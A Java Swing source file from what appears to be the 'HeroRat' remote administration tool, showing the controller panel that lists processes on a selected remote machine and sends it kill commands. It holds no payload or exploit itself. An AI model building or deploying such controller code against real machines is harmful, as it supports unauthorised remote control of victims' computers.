package net.herorat.gui;

import java.awt.BorderLayout;
import java.awt.event.ActionEvent;
import java.awt.event.ActionListener;
import java.awt.event.MouseAdapter;
import java.awt.event.MouseEvent;

import javax.swing.*;
import net.herorat.Main;
import net.herorat.features.process.Process;
import net.herorat.features.servers.Server;
import net.herorat.network.Network;
import net.herorat.utils.Utils;


public class PanelProcess extends JPanel
{
	private static final long serialVersionUID = 5554527594694870999L;
	
	private JLabel label_select;
	public JButton button_start;
	private boolean running = false;

	public TableModel model_process;
	
	private JPopupMenu menu_dropdown;
	
	private JTable table_process;
	private JScrollPane scroll_process;
	
	private Server server;
	
	private Timer timer_refresh = new Timer(10000, new ActionListener() {
		public void actionPerformed(ActionEvent e)
		{
			for(int i=model_process.getRowCount() - 1; i>=0; i--) model_process.removeRow(i);
            if(Network.getServerPositionInList(server)==0){
                stopService();
            }else{
                if (server != null) Process.send(server);
            }
		}
	});
	
	public PanelProcess()
	{
		initComponents();
		display();
	}

	private void initComponents()
	{
		setLayout(new BorderLayout(5, 0));
		createSelect();
		createDropDown();
		createModel();
		createTable();
	}
	
	private void display()
	{
		setVisible(true);
	}
	
	private void createSelect()
	{
		label_select = new JLabel("Select a user from the tree list.");
//		combo_select = new JComboBox<String>( Network.getServerList(false) );
        button_start = new JButton("Start service");
        button_start.addActionListener(new ActionListener() {
            @Override
            public void actionPerformed(ActionEvent e) {
                if(running){
                    stopService();
                }else{
                    startService();
                }
            }
        });

		JPanel top_panel = new JPanel();
		top_panel.setLayout(new BorderLayout(5, 0));
		top_panel.setBorder(BorderFactory.createEmptyBorder(0, 2, 5, 2));
		top_panel.add(label_select, BorderLayout.LINE_START);
        top_panel.add(button_start, BorderLayout.LINE_END);
//		top_panel.add(combo_select);
		add(top_panel, BorderLayout.NORTH);
	}

    public Server getActiveServer(){
        return server;
    }

	private void startService(){
        server = Main.mainWindow.ServerStatusTree.getSelectedServer();
        for(int i=model_process.getRowCount() - 1; i>=0; i--) model_process.removeRow(i);

        if (server != null){
            button_start.setText("Stop service");
            label_select.setText("Talking to: "+server.getServerName()+"@"+server.getIp());
            Process.send(server);
            for (int i=0; i<server.array_process.size(); i++) model_process.addRow(server.array_process.get(i));
        }else{
            stopService();
            return;
        }
        running = true;
        timer_refresh.start();
    }

    private void stopService(){
        timer_refresh.stop();
        for(int i=model_process.getRowCount() - 1; i>=0; i--) model_process.removeRow(i);
        server = null;
        running = false;
        label_select.setText("Select a user from the tree list.");
        button_start.setText("Start service");
    }

	private void createDropDown()
	{
		menu_dropdown = new JPopupMenu();
		
		JMenuItem item = new JMenuItem();
		item.setText("Kill");
		item.setIcon(new ImageIcon(Utils.toByteArray(this.getClass().getClassLoader().getResourceAsStream("/images/kill.png"))));
		item.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent evt)
			{
				String id = table_process.getValueAt(table_process.getSelectedRow(), 1).toString();
				if (server != null)
				{
					model_process.removeRow(table_process.getSelectedRow());
					Process.sendKill(server, id);
				}
			}
		});
		menu_dropdown.add(item);
	}
	
	private void createModel()
	{
		model_process = new TableModel(new String[] { "Name", "PID", "Session", "Size" });
	}
	
	private void createTable()
	{
		table_process = new JTable();
		scroll_process = new JScrollPane();
		
		table_process.setModel(model_process);
		table_process.setComponentPopupMenu(menu_dropdown);
		table_process.setDropMode(DropMode.ON);
		table_process.setSelectionMode(0);
		table_process.setRowHeight(20);
		table_process.addMouseListener(new MouseAdapter() {
			public void mouseClicked(MouseEvent evt) {}
			public void mousePressed(MouseEvent evt)
			{
				int t = (int) (evt.getPoint().getY() / 20.0D);
				table_process.getSelectionModel().setSelectionInterval(t, t);
			}
		});
		scroll_process.setViewportView(table_process);
		add(scroll_process);
		
		table_process.getColumn("PID").setMaxWidth(64);
		table_process.getColumn("PID").setMinWidth(64);
		
		table_process.getTableHeader().setReorderingAllowed(false);
	}
}